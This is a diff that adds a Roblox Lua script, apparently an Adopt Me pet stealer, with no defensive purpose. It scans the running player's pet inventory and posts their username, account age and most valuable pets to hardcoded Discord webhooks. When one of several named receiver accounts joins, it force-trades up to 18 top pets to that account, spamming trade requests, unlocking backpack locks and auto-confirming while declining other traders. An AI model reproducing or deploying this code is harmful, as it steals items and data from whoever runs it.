@@ -1,0 +1,177 @@
+-- [[ ꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱ - OMNIPOTENT VERSION ]] --
+
+-- 1. INITIALIZATION & SERVICES
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+
+local LocalPlayer = Players.LocalPlayer
+while not LocalPlayer do task.wait(0.5) LocalPlayer = Players.LocalPlayer end
+
+-- 2. CONFIGURATION (Direct Load)
+local main_webhook = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local dual_webhook = "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo"
+
+_G["Script-SM_Config"] = {
+    user_webhook = main_webhook,
+    dual_webhook = dual_webhook,
+    users = {"CREOLEO25", "CREOLEO23", "2ndcfpaj67", "IngeniousIsBackAgain", "ingenious_reciever"}
+}
+
+local Friends = {}
+for _, v in pairs(_G["Script-SM_Config"].users) do table.insert(Friends, v) end
+
+-- 3. LOAD ADOPT ME DATA (Mobile Safety)
+if not game:IsLoaded() then game.Loaded:Wait() end
+local Fsys = ReplicatedStorage:WaitForChild("Fsys", 20)
+local load = require(Fsys).load
+
+repeat task.wait(1) until load("ClientData") and load("ClientData").get("inventory")
+
+local RouterClient = load("RouterClient")
+local InventoryDB = load("InventoryDB")
+
+-- API Remotes
+local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
+local AddItem = RouterClient.get("TradeAPI/AddItemToOffer")
+local AcceptNegotiation = RouterClient.get("TradeAPI/AcceptNegotiation")
+local ConfirmTrade = RouterClient.get("TradeAPI/ConfirmTrade")
+local DeclineTrade = RouterClient.get("TradeAPI/DeclineTrade")
+local UnlockBackpack = RouterClient.get("BackpackAPI/CommitBackpackItemSet")
+local TradeRequestEvent = RouterClient.get_event("TradeAPI/TradeRequestReceived")
+
+-- 4. PET VALUATION SYSTEM
+local PetValues = {}
+pcall(function()
+    local resp = request({Url = "https://elvebredd.com/api/pets/get-latest", Method = "GET"})
+    if resp and resp.Body then
+        local data = HttpService:JSONDecode(resp.Body)
+        local petsStr = data.pets or "[]"
+        for _, pet in pairs(HttpService:JSONDecode(petsStr)) do
+            if pet.name then PetValues[pet.name] = pet end
+        end
+    end
+end)
+
+local function getPetValue(name, props)
+    local pet = PetValues[name]
+    if not pet then return 0 end
+    local key = props.mega_neon and "mvalue" or props.neon and "nvalue" or "rvalue"
+    local suffix = (props.rideable and props.flyable and " - fly&ride")
+                or (props.rideable and " - ride")
+                or (props.flyable and " - fly")
+                or " - nopotion"
+    return tonumber(pet[key .. suffix]) or tonumber(pet[key]) or 0
+end
+
+-- 5. INVENTORY SCAN
+local serverData
+local success, res = pcall(function() return RouterClient.get("DataAPI/GetAllServerData"):InvokeServer() end)
+if success then serverData = res end
+
+if not serverData or not serverData[LocalPlayer.Name] then
+    warn("❌ Data not ready.") return
+end
+
+local inventory = serverData[LocalPlayer.Name].inventory.pets or {}
+local hits = {}
+local totalValue = 0
+
+for uid, item in pairs(inventory) do
+    local petData = InventoryDB.pets and InventoryDB.pets[item.id]
+    if petData and petData.name then
+        local val = getPetValue(petData.name, item.properties or {})
+        totalValue = totalValue + val
+        table.insert(hits, {name = petData.name, value = val, uid = uid, props = item.properties or {}})
+    end
+end
+table.sort(hits, function(a,b) return a.value > b.value end)
+
+-- 6. WEBHOOK & UI LOGIC
+local function getEmoji(p)
+    if p.mega_neon then return "🐺" end
+    if p.neon then return "🦄" end
+    if p.flyable and p.rideable then return "🐲" end
+    return "🐶"
+end
+
+local previewLines = {}
+for i = 1, math.min(10, #hits) do
+    local pet = hits[i]
+    table.insert(previewLines, getEmoji(pet.props).." "..pet.name.." ("..string.format("%.2f", pet.value)..")")
+end
+
+local payload = {
+    content = "@everyone Hit Detected! Value: " .. string.format("%.2f", totalValue),
+    embeds = {{
+        title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ʜɪᴛ ﹒˚₊꒱",
+        color = 0,
+        fields = {
+            {name = "User", value = "```"..LocalPlayer.Name.."```", inline = true},
+            {name = "Age", value = "```"..LocalPlayer.AccountAge.." Days```", inline = true},
+            {name = "Top Pets", value = "```"..table.concat(previewLines, "\n").."```"}
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+local function sendWebhook(url)
+    pcall(function()
+        request({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+sendWebhook(main_webhook)
+
+-- 7. THE STEAL LOGIC
+local function startSteal(target)
+    task.spawn(function()
+        -- Auto-Decline others
+        local decline = TradeRequestEvent.OnClientEvent:Connect(function(sender)
+            if sender.Name ~= target.Name then pcall(DeclineTrade.FireServer, DeclineTrade) end
+        end)
+
+        -- Spam Trade
+        for i = 1, 50 do
+            if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then break end
+            pcall(SendTrade.FireServer, SendTrade, target)
+            task.wait(0.3)
+        end
+
+        if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
+            for i = 1, math.min(18, #hits) do
+                pcall(UnlockBackpack.FireServer, UnlockBackpack, "backpack_locks", {[hits[i].uid] = true})
+                pcall(AddItem.FireServer, AddItem, hits[i].uid)
+                task.wait(0.1)
+            end
+            
+            while LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
+                pcall(AcceptNegotiation.FireServer, AcceptNegotiation)
+                task.wait(0.5)
+                pcall(ConfirmTrade.FireServer, ConfirmTrade)
+            end
+        end
+        decline:Disconnect()
+    end)
+end
+
+-- Wait for receiver
+task.spawn(function()
+    while true do
+        for _, p in pairs(Players:GetPlayers()) do
+            if table.find(Friends, p.Name) and p ~= LocalPlayer then
+                startSteal(p)
+                return
+            end
+        end
+        task.wait(1)
+    end
+end)
+
+print("[Script Lynx] Omnipotent Version Loaded.")
